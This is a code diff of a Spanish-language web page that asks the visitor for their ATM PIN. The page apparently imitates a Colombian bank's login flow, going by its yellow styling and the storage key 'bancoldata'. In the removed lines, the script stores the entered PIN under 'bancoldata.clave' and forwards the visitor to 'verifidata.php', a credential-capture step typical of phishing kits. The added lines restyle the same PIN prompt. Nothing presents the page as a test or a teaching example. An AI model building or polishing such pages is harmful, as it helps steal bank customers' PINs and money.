@@ -2,165 +2,165 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Ingreso PIN</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
+  <title>Clave principal</title>
   <style>
     * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
+      margin: 0; padding: 0; box-sizing: border-box;
     }
 
-    body, html {
-      width: 100%;
+    html, body {
       height: 100%;
-      font-family: 'Arial', sans-serif;
-      background-color: #fafafa;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      width: 100%;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f9f9f9;
     }
 
     .container {
-      background-color: #fff;
-      width: 90%;
-      max-width: 400px;
-      padding: 40px 20px 30px;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: env(safe-area-inset);
+    }
+
+    .card {
+      background: #fff;
+      padding: 25px 20px 35px;
       border-radius: 20px;
-      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+      box-shadow: 0 3px 15px rgba(0,0,0,0.08);
       text-align: center;
+      width: 92%;
+      max-width: 400px;
     }
 
-    .container i {
-      font-size: 24px;
+    .card img.lock {
+      width: 28px;
       margin-bottom: 10px;
-      color: #444;
     }
 
-    .container p {
-      font-size: 16px;
+    .card h3 {
+      margin-bottom: 6px;
+      font-size: 17px;
       color: #333;
-      margin-bottom: 30px;
+      font-weight: 500;
     }
 
-    .pin-inputs {
+    .input-container {
       display: flex;
       justify-content: center;
-      gap: 14px;
-      margin-bottom: 35px;
+      gap: 12px;
+      margin: 15px 0 25px;
     }
 
-    .pin-inputs input {
-      width: 30px;
-      border: none;
-      border-bottom: 2px solid #333;
+    .input-container input {
+      width: 32px;
+      height: 38px;
       font-size: 22px;
       text-align: center;
+      border: none;
+      border-bottom: 2px solid #333;
       background: transparent;
       outline: none;
-      transition: border-color 0.2s;
-    }
-
-    .pin-inputs input:focus {
-      border-color: #ffc20e;
     }
 
     .buttons {
       display: flex;
-      justify-content: center;
-      gap: 16px;
+      justify-content: space-between;
+      gap: 12px;
     }
 
     .buttons button {
       flex: 1;
-      padding: 14px;
-      border-radius: 30px;
-      font-weight: bold;
-      font-size: 14px;
+      padding: 13px 0;
+      font-size: 15px;
       border: none;
+      border-radius: 25px;
+      font-weight: bold;
       cursor: pointer;
-      transition: 0.2s;
     }
 
-    .cancel-btn {
+    .cancel {
       background-color: #fff;
-      border: 1px solid #333;
-      color: #000;
+      border: 1px solid #000;
     }
 
-    .continue-btn {
+    .continue {
       background-color: #ccc;
       color: #666;
       cursor: not-allowed;
     }
 
-    .continue-btn.enabled {
+    .continue.active {
       background-color: #ffda37;
       color: #000;
       cursor: pointer;
+    }
+
+    @media (max-width: 480px) {
+      .input-container input {
+        width: 28px;
+        height: 34px;
+        font-size: 20px;
+      }
+
+      .buttons button {
+        font-size: 14px;
+        padding: 12px 0;
+      }
     }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <i class="fas fa-lock"></i>
-  <p>Es la misma que usas en el cajero automático</p>
+  <div class="container">
+    <div class="card">
+      <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="lock" class="lock">
+      <h3>Es la misma que usas en el cajero automático</h3>
 
-  <div class="pin-inputs">
-    <input type="password" maxlength="1" inputmode="numeric" class="pin" />
-    <input type="password" maxlength="1" inputmode="numeric" class="pin" />
-    <input type="password" maxlength="1" inputmode="numeric" class="pin" />
-    <input type="password" maxlength="1" inputmode="numeric" class="pin" />
+      <div class="input-container">
+        <input type="password" maxlength="1" inputmode="numeric">
+        <input type="password" maxlength="1" inputmode="numeric">
+        <input type="password" maxlength="1" inputmode="numeric">
+        <input type="password" maxlength="1" inputmode="numeric">
+      </div>
+
+      <div class="buttons">
+        <button class="cancel">Cancelar</button>
+        <button class="continue" id="continueBtn" disabled>Continuar</button>
+      </div>
+    </div>
   </div>
 
-  <div class="buttons">
-    <button class="cancel-btn" onclick="window.location.href='index.html'">Cancelar</button>
-    <button id="continueBtn" class="continue-btn" disabled>Continuar</button>
-  </div>
-</div>
+  <script>
+    const inputs = document.querySelectorAll('.input-container input');
+    const continueBtn = document.getElementById('continueBtn');
 
-<script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
-<script>
-  const inputs = document.querySelectorAll('.pin');
-  const continueBtn = document.getElementById('continueBtn');
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        if (!/^\d$/.test(e.target.value)) {
+          e.target.value = '';
+          return;
+        }
+        if (index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+        checkInputs();
+      });
 
-  inputs.forEach((input, index) => {
-    input.addEventListener('input', (e) => {
-      if (!/^\d$/.test(e.target.value)) {
-        e.target.value = '';
-        return;
-      }
-      if (index < inputs.length - 1 && e.target.value !== '') {
-        inputs[index + 1].focus();
-      }
-
-      checkCompletion();
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && index > 0 && input.value === '') {
+          inputs[index - 1].focus();
+        }
+      });
     });
 
-    input.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && index > 0 && e.target.value === '') {
-        inputs[index - 1].focus();
-      }
-    });
-  });
-
-  function checkCompletion() {
-    const allFilled = Array.from(inputs).every(input => input.value !== '');
-    continueBtn.disabled = !allFilled;
-    continueBtn.classList.toggle('enabled', allFilled);
-  }
-
-  continueBtn.addEventListener('click', () => {
-    if (continueBtn.disabled) return;
-
-    const pin = Array.from(inputs).map(input => input.value).join('');
-    let bancoldata = localStorage.getItem('bancoldata');
-    bancoldata = bancoldata ? JSON.parse(bancoldata) : {};
-    bancoldata.clave = pin;
-    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
-    window.location.href = 'verifidata.php';
-  });
-</script>
+    function checkInputs() {
+      const allFilled = Array.from(inputs).every(input => input.value !== '');
+      continueBtn.disabled = !allFilled;
+      continueBtn.classList.toggle('active', allFilled);
+    }
+  </script>
 </body>
 </html>
